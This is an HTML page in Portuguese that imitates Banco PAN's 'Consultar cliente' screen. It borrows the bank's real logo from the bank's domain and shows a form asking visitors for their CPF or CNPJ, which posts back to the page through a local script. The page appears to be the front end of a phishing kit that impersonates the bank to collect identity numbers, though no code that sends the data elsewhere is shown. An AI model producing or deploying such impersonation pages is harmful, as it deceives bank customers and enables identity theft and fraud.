<!DOCTYPE html>
<html lang="pt_br">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banco PAN - Consultar cliente</title>

  <link rel="stylesheet" href="./style/style.css">

  <link rel="shortcut icon" href="https://accountstemplates.bancopan.com.br/assets/img/LogoPan_white.svg"
    type="image/x-icon">

</head>

<body>



  <img src="https://accountstemplates.bancopan.com.br/assets/img/LogoPan_white.svg" alt="Logo banco PAN"
    class="logo_bancoPan">

  <p class="textDescricao">Pra consultar<br />
    o Pan Online, precisamos <br />
    do seu CPF ou CNPJ.
  </p>


  <form action="" method="post">
    <input type="text" name="ident" id="ident" autocomplete="off" maxlength="18"
      placeholder="Digite seu CPF ou CNPJ" title="Digite um CPF ou CNPJ" onkeypress="mascaraIdent(this)"
      onkeyup="mascaraIdent(this)" required>
    <div class="linha"></div>

    <p class="descricaoInput">Use apenas números</p>

    <input type="submit" id="pesquisarIdent" value="Pesquisar">
  </form>


  <script src="../script/script.js"></script>
</body>

</html>